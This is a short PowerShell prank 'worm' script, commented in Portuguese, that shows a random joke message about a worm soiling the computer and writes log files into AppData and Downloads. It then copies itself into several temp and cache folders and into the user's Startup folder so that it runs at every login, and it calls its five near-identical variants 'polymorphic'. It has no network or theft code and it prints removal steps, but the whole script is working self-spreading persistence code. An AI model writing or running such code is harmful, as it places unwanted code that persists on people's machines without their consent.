# --- CONFIGURAÇÃO PRINCIPAL ---
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\minhoca.ps1"
$tempPath    = "$env:TEMP\minhoca.ps1"
$cache1      = "$env:LOCALAPPDATA\Temp\minhoca.ps1"
$cache2      = "$env:APPDATA\Cache\minhoca.ps1"
$logDir      = "$env:APPDATA\MinhocaSafada"
$logFile     = "$logDir\log.txt"
$downloadsDir = "$env:USERPROFILE\Downloads"
$downloadLogsDir = "$downloadsDir\MinhocaLogs"

# Cria pastas se não existirem
if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir | Out-Null }
if (-not (Test-Path $downloadLogsDir)) { New-Item -ItemType Directory -Path $downloadLogsDir | Out-Null }

# --- FRASES DE ZOEIRA ---
$frases = @(
    "🪱 A minhoca está cagando no seu PC, limpe ele agora ou ele ficará embostiado!",
    "🪱 A minhoca tá passeando nas pastas de cache, cuidado com a sujeira!",
    "🪱 Limpe seu PC, a minhoca deixou rastro de terra em todos os cantos!",
    "🪱 Seu PC tá cheio de minhoca, bora dar uma geral nele!",
    "🪱 Atenção! A minhoca está aprontando travessuras no seu PC!"
)

# --- FUNÇÃO PARA ESCOLHER FRASE ALEATÓRIA ---
function Escolhe-Frase { param($lista); return Get-Random -InputObject $lista }

# --- FUNÇÃO PARA GERAR LOG DE CÔCO ---
function Log-Coco {
    $quantidade = Get-Random -Minimum 1 -Maximum 11
    $arquivoLog = Join-Path $downloadLogsDir ("coco_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".txt")
    $conteudo = "$(Get-Date) - A minhoca deixou $quantidade côco(s) no seu PC! 🪱💩"
    Set-Content -Path $arquivoLog -Value $conteudo
    Write-Host "Minhoca deixou $quantidade côco(s) no PC. Log criado em: $arquivoLog" -ForegroundColor Yellow
}

# --- VERSÕES POLIMÓRFICAS ---
$versoes = @(
    @{ Nome = "VersaoA"; Codigo = { $frase = Escolhe-Frase $frases; Write-Host $frase -ForegroundColor Yellow; Add-Content -Path $logFile -Value "$(Get-Date) - $frase"; Log-Coco; Pause } },
    @{ Nome = "VersaoB"; Codigo = { $frase = Escolhe-Frase $frases; Write-Host $frase -ForegroundColor Green; Add-Content -Path $logFile -Value "$(Get-Date) - $frase"; Log-Coco; Pause } },
    @{ Nome = "VersaoC"; Codigo = { $frase = Escolhe-Frase $frases; Write-Host $frase -ForegroundColor Cyan; Add-Content -Path $logFile -Value "$(Get-Date) - $frase"; Log-Coco; Pause } },
    @{ Nome = "VersaoD"; Codigo = { $frase = Escolhe-Frase $frases; Write-Host $frase -ForegroundColor Magenta; Add-Content -Path $logFile -Value "$(Get-Date) - $frase"; Log-Coco; Pause } },
    @{ Nome = "VersaoE"; Codigo = { $frase = Escolhe-Frase $frases; Write-Host $frase -ForegroundColor White; Add-Content -Path $logFile -Value "$(Get-Date) - $frase"; Log-Coco; Pause } }
)

# --- ESCOLHE UMA VERSÃO ALEATÓRIA ---
$versaoAtual = Get-Random -InputObject $versoes
& $versaoAtual.Codigo

# --- COPIA O SCRIPT PARA DESTINOS ---
$scriptSource = $MyInvocation.MyCommand.Path
Copy-Item $scriptSource -Destination $tempPath  -Force
Copy-Item $scriptSource -Destination $cache1    -Force
Copy-Item $scriptSource -Destination $cache2    -Force
Copy-Item $scriptSource -Destination $startupPath -Force

Write-Host "Minhoca espalhada no cache e adicionada ao Startup."
Write-Host "Para remover: apague os arquivos minhoca.ps1 nas pastas TEMP, CACHE, Startup e a pasta MinhocaLogs na Downloads."
Pause